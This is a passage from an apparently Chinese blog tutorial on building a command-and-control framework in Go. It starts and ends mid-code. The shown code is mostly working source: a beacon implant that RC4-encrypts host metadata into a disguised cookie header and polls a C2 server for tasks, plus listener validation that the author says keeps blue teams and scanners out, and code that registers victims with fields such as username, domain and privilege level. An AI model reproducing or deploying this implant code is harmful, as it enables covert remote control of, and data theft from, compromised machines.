class="number">0</span>] + <span class="string">&quot;/&quot;</span> + profile.BeaconProfile.URI</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ====== RC4加密 ======</span></span><br><span class="line">	rc4_key := profile.BeaconProfile.EncryptKey</span><br><span class="line">	encryptedMetaData, err := RC4Crypt(metaData, rc4_key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// ====== base64url 编码 ======</span></span><br><span class="line">	metaDataB64 := base64.RawURLEncoding.EncodeToString(encryptedMetaData)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ====== 设置到请求头 ======</span></span><br><span class="line">	cookieValue := profile.BeaconProfile.HBPrefix + metaDataB64</span><br><span class="line"></span><br><span class="line">	req, err := http.NewRequest(<span class="string">&quot;GET&quot;</span>, url, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Request error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	req.Header.Set(profile.BeaconProfile.HBHeader, cookieValue)</span><br><span class="line">	req.Header.Set(<span class="string">&quot;User-Agent&quot;</span>, profile.BeaconProfile.UserAgent)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ====== 发送HTTP GET请求 ======</span></span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;HTTP error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	respBytes, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Status:&quot;</span>, resp.StatusCode)</span><br><span class="line">		fmt.Println(<span class="string">&quot;Decrypted Response:&quot;</span>, <span class="type">string</span>(respBytes))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;http response error:&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 用 SessionKey RC4 解密</span></span><br><span class="line">	decrypted, err := RC4Crypt(respBytes, sessionKey)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;rc4 decrypt error:%v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;Status:&quot;</span>, resp.StatusCode)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Decrypted Response:&quot;</span>, <span class="type">string</span>(decrypted))</span><br><span class="line">	<span class="keyword">return</span> decrypted, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/common/crypt.go</code>：目前只有RC4加密&#x2F;解密</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> common</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/rc4&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RC4Crypt</span><span class="params">(data []<span class="type">byte</span>, key []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	rc4crypt, encrypt := rc4.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> encrypt != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;rc4 crypt error&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	decryptData := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(data))</span><br><span class="line">	rc4crypt.XORKeyStream(decryptData, data)</span><br><span class="line">	<span class="keyword">return</span> decryptData, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>main.go</code> ok终于到main函数了，先不着急运行，等到 <code>4.4 测试</code> 的时候启动！</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;Beacon/profile&quot;</span></span><br><span class="line">	<span class="string">&quot;Beacon/sysinfo&quot;</span></span><br><span class="line">	<span class="string">&quot;Beacon/utils/common&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> heartBeat sysinfo.HeartBeat</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">	profile.BeaconProfile, err = profile.LoadConfig()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%+v\n&quot;</span>, profile.BeaconProfile)</span><br><span class="line"></span><br><span class="line">	heartBeat = sysinfo.InitHeartBeat()</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%+v\n&quot;</span>, heartBeat)</span><br><span class="line"></span><br><span class="line">	metaData := sysinfo.PackHeartBeat(heartBeat)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		time.Sleep(time.Duration(profile.BeaconProfile.Sleep) * time.Second)</span><br><span class="line">		AssemblyBuff, err := common.HttpGet(metaData, heartBeat.SessionKey)</span><br><span class="line">		<span class="built_in">println</span>(<span class="type">string</span>(AssemblyBuff))</span><br><span class="line">		<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="4-3-注册-server端"><a href="#4-3-注册-server端" class="headerlink" title="4.3 注册-server端"></a>4.3 注册-server端</h2><p>还记得我们在前面留下的<strong>TODO</strong>吗？我们processRequest和processResponse还没实现呢，在这里要实现processRequest，然后补充validate和parseBeat方法，这两个方法processRequest和processResponse都会用到，且听我解释</p>
<ol>
<li><code>processRequest</code>：是用来处理Beacon通过<strong>GET</strong>方式来拉取任务的请求，首先调用 <code>validate</code> 请求鉴权，然后调用parseBeat获取心跳数据为注册Beacon做准备，根据BeaconId去查找是Beacon是否存在，如果不存在则注册。具体细节看代码吧。</li>
<li><code>validate</code>：轻量的<strong>请求鉴权</strong>，防止非预期的访问者（如蓝队、爬虫、扫描器）误打误撞访问到我们的C2 Listener</li>
<li><code>parseBeat</code>：从自定义请求头中获取BeaconId和剩余心跳包数据</li>
</ol>
<p>当然为了防止数据被修改，还可以加上HMAC验证数据的完整性，这里不过多介绍。</p>
<p><code>handler/listener/http_listener.go</code>：补充processRequest（不完整的）、validate、parseBeat方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler *HTTP)</span></span> parseBeat(ctx *gin.Context) (<span class="type">string</span>, []<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 1. 解析 Cookie 里的 SESSIONID    </span></span><br><span class="line">    cookie := ctx.Request.Header.Get(handler.Config.HBHeader)  </span><br><span class="line">    <span class="keyword">if</span> !strings.HasPrefix(cookie, handler.Config.HBPrefix) &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="literal">nil</span>, errors.New(<span class="string">&quot;no SESSIONID in cookie&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    beatB64 := strings.TrimPrefix(cookie, handler.Config.HBPrefix)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 2. base64url 解码  </span></span><br><span class="line">    beaconInfoCrypt, err := base64.RawURLEncoding.DecodeString(beatB64)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> || <span class="built_in">len</span>(beaconInfoCrypt) &lt; <span class="number">8</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="literal">nil</span>, errors.New(<span class="string">&quot;failed to decode beat&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 3. RC4 解密  </span></span><br><span class="line">    rc4crypt, err := rc4.NewCipher([]<span class="type">byte</span>(handler.Config.EncryptKey))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="literal">nil</span>, errors.New(<span class="string">&quot;rc4 decrypt error&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    beaconInfo := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(beaconInfoCrypt))  </span><br><span class="line">    rc4crypt.XORKeyStream(beaconInfo, beaconInfoCrypt)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 4. 解析 beaconType 和 beaconId    </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(beaconInfo) &lt; <span class="number">8</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="literal">nil</span>, errors.New(<span class="string">&quot;beat too short&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    beaconId := binary.BigEndian.Uint32(beaconInfo[:<span class="number">4</span>])  </span><br><span class="line">    restbeaconInfo := beaconInfo[<span class="number">4</span>:]  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%08x&quot;</span>, beaconId), restbeaconInfo, <span class="literal">nil</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler *HTTP)</span></span> validate(ctx *gin.Context) <span class="type">error</span> &#123;  </span><br><span class="line">    <span class="comment">// 1. 校验 URI    </span></span><br><span class="line">    u, err := url.Parse(ctx.Request.RequestURI)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> || handler.Config.URI != u.Path &#123;  </span><br><span class="line">       handler.pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 2. 校验 HostHeader    </span></span><br><span class="line">    <span class="keyword">if</span> handler.Config.HostHeader != <span class="string">&quot;&quot;</span> &amp;&amp; handler.Config.HostHeader != ctx.Request.Host &#123;  </span><br><span class="line">       handler.pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 3. 校验 UserAgent    </span></span><br><span class="line">    <span class="keyword">if</span> handler.Config.UserAgent != ctx.Request.UserAgent() &#123;  </span><br><span class="line">       handler.pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler *HTTP)</span></span> processRequest(ctx *gin.Context) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 校验请求合法性  </span></span><br><span class="line">    err := handler.validate(ctx)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取外部 IP    </span></span><br><span class="line">    externalIP := strings.Split(ctx.Request.RemoteAddr, <span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]  </span><br><span class="line">    <span class="keyword">if</span> handler.Config.XForwardedFor &#123;  </span><br><span class="line">       xff := ctx.Request.Header.Get(<span class="string">&quot;X-Forwarded-For&quot;</span>)  </span><br><span class="line">       <span class="keyword">if</span> xff != <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">          externalIP = xff  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beaconId, beat, err := handler.parseBeat(ctx)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       handler.pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> !listenerHTTP.ts.BeaconIsExists(beaconId) &#123;  </span><br><span class="line">       <span class="keyword">if</span> err := listenerHTTP.ts.BeaconCreate(beaconId, beat, handler.Name, externalIP, <span class="literal">true</span>); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          handler.pageError(ctx)  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    ctx.AbortWithStatus(http.StatusOK)  </span><br><span class="line">    <span class="keyword">return</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/listener/http_type.go</code>：在TeamServer处定义BeaconIsExists和BeaconCreate方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">interface</span> &#123;  </span><br><span class="line">    BeaconIsExists(beaconId <span class="type">string</span>) <span class="type">bool</span>  </span><br><span class="line">    BeaconCreate(beaconId <span class="type">string</span>, beat []<span class="type">byte</span>, listenerName <span class="type">string</span>, ExternalIP <span class="type">string</span>, Async <span class="type">bool</span>) <span class="type">error</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>server/beacon.go</code>：实现BeaconIsExists和BeaconCreate方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ts *TeamServer)</span></span> BeaconIsExists(beaconId <span class="type">string</span>) <span class="type">bool</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> ts.Beacons.Contains(beaconId)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ts *TeamServer)</span></span> BeaconCreate(beaconId <span class="type">string</span>, beat []<span class="type">byte</span>, listenerName <span class="type">string</span>, ExternalIP <span class="type">string</span>, Async <span class="type">bool</span>) <span class="type">error</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(beat) &lt; <span class="number">4</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;data too short&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 读取前4字节大端长度  </span></span><br><span class="line">    length := binary.BigEndian.Uint32(beat[:<span class="number">4</span>])  </span><br><span class="line">    <span class="keyword">if</span> <span class="type">int</span>(length) &gt; <span class="built_in">len</span>(beat)<span class="number">-4</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;invalid string length&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 读取字符串内容（去掉末尾的 \x00）  </span></span><br><span class="line">    strBytes := beat[<span class="number">4</span> : <span class="number">4</span>+<span class="type">int</span>(length)]  </span><br><span class="line">    beaconName := <span class="type">string</span>(strBytes)  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(beaconName) &gt; <span class="number">0</span> &amp;&amp; beaconName[<span class="built_in">len</span>(beaconName)<span class="number">-1</span>] == <span class="string">&#x27;\x00&#x27;</span> &#123;  </span><br><span class="line">       beaconName = beaconName[:<span class="built_in">len</span>(beaconName)<span class="number">-1</span>]  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 剩余数据  </span></span><br><span class="line">    restbeat := beat[<span class="number">4</span>+<span class="type">int</span>(length):]  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> restbeat == <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;beacon %v does not register&quot;</span>, beaconId)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    ok := ts.Beacons.Contains(beaconId)  </span><br><span class="line">    <span class="keyword">if</span> ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;beacon %v already exists&quot;</span>, beaconId)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beaconData, err := ts.Handler.BeaconCreate(beaconName, restbeat)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beaconData.Name = beaconName  </span><br><span class="line">    beaconData.Id = beaconId  </span><br><span class="line">    beaconData.Listener = listenerName  </span><br><span class="line">    beaconData.ExternalIP = ExternalIP  </span><br><span class="line">    beaconData.CreateTime = time.Now().Unix()  </span><br><span class="line">    beaconData.LastTick = <span class="type">int</span>(time.Now().Unix())  </span><br><span class="line">    beaconData.Async = Async  </span><br><span class="line">    beaconData.Tags = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    beaconData.Mark = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    beaconData.Color = <span class="string">&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    value, ok := ts.Listeners.Get(listenerName)  </span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;listener %v does not exists&quot;</span>, listenerName)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    lType := strings.Split(value.(response.ListenerData).Type, <span class="string">&quot;/&quot;</span>)[<span class="number">0</span>]  </span><br><span class="line">    <span class="keyword">if</span> lType == <span class="string">&quot;internal&quot;</span> &#123;  </span><br><span class="line">       beaconData.Mark = <span class="string">&quot;Unlink&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beacon := &amp;Beacon&#123;  </span><br><span class="line">       Data:       beaconData,  </span><br><span class="line">       TasksQueue: safeType.NewSlice(),  </span><br><span class="line">       Active:     <span class="literal">true</span>,  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    ts.Beacons.Put(beaconData.Id, beacon)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon.go</code> 补充BeaconCreate方法，找到相应的beaconHandler</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Handler)</span></span> BeaconCreate(beaconName <span class="type">string</span>, beat []<span class="type">byte</span>) (response.BeaconData, <span class="type">error</span>) &#123;  </span><br><span class="line">    beaconHandler, ok := h.BeaconHandlers[beaconName]  </span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> response.BeaconData&#123;&#125;, errors.New(<span class="string">&quot;beacon handler not found&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> beaconHandler.BeaconCreate(beat)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/types.go</code>：定义BeaconHandler接口的BeaconCreate方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> BeaconHandler <span class="keyword">interface</span> &#123;  </span><br><span class="line">    BeaconGenerate(beaconConfig request.GenerateConfig, listenerConfig request.ConfigDetail) ([]<span class="type">byte</span>, <span class="type">string</span>, <span class="type">error</span>)  </span><br><span class="line">    BeaconCreate(beat []<span class="type">byte</span>) (response.BeaconData, <span class="type">error</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/response/beacon.go</code>：补充BeaconData结构体，这个结构体本来是要json序列化发送给前端的，教学并未实现。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> BeaconData <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Id           <span class="type">string</span> <span class="string">`json:&quot;b_id&quot;`</span>  </span><br><span class="line">    Name         <span class="type">string</span> <span class="string">`json:&quot;b_name&quot;`</span>  </span><br><span class="line">    SessionKey   []<span class="type">byte</span> <span class="string">`json:&quot;b_session_key&quot;`</span>  </span><br><span class="line">    Listener     <span class="type">string</span> <span class="string">`json:&quot;b_listener&quot;`</span>  </span><br><span class="line">    Async        <span class="type">bool</span>   <span class="string">`json:&quot;b_async&quot;`</span>  </span><br><span class="line">    ExternalIP   <span class="type">string</span> <span class="string">`json:&quot;b_external_ip&quot;`</span>  </span><br><span class="line">    InternalIP   <span class="type">string</span> <span class="string">`json:&quot;b_internal_ip&quot;`</span>  </span><br><span class="line">    GmtOffset    <span class="type">int</span>    <span class="string">`json:&quot;b_gmt_offset&quot;`</span>  </span><br><span class="line">    Sleep        <span class="type">uint</span>   <span class="string">`json:&quot;b_sleep&quot;`</span>  </span><br><span class="line">    Jitter       <span class="type">uint</span>   <span class="string">`json:&quot;b_jitter&quot;`</span>  </span><br><span class="line">    Pid          <span class="type">string</span> <span class="string">`json:&quot;b_pid&quot;`</span>  </span><br><span class="line">    Tid          <span class="type">string</span> <span class="string">`json:&quot;b_tid&quot;`</span>  </span><br><span class="line">    Arch         <span class="type">string</span> <span class="string">`json:&quot;b_arch&quot;`</span>  </span><br><span class="line">    Elevated     <span class="type">bool</span>   <span class="string">`json:&quot;b_elevated&quot;`</span>  </span><br><span class="line">    Process      <span class="type">string</span> <span class="string">`json:&quot;b_process&quot;`</span>  </span><br><span class="line">    Os           <span class="type">int</span>    <span class="string">`json:&quot;b_os&quot;`</span>  </span><br><span class="line">    OsDesc       <span class="type">string</span> <span class="string">`json:&quot;b_os_desc&quot;`</span>  </span><br><span class="line">    Domain       <span class="type">string</span> <span class="string">`json:&quot;b_domain&quot;`</span>  </span><br><span class="line">    Computer     <span class="type">string</span> <span class="string">`json:&quot;b_computer&quot;`</span>  </span><br><span class="line">    Username     <span class="type">string</span> <span class="string">`json:&quot;b_username&quot;`</span>  </span><br><span class="line">    Impersonated <span class="type">string</span> <span class="string">`json:&quot;b_impersonated&quot;`</span>  </span><br><span class="line">    OemCP        <span class="type">int</span>    <span class="string">`json:&quot;b_oemcp&quot;`</span>  </span><br><span class="line">    ACP          <span class="type">int</span>    <span class="string">`json:&quot;b_acp&quot;`</span>  </span><br><span class="line">    CreateTime   <span class="type">int64</span>  <span class="string">`json:&quot;b_create_time&quot;`</span>  </span><br><span class="line">    LastTick     <span class="type">int</span>    <span class="string">`json:&quot;b_last_tick&quot;`</span>  </span><br><span class="line">    KillDate     <span class="type">int</span>    <span 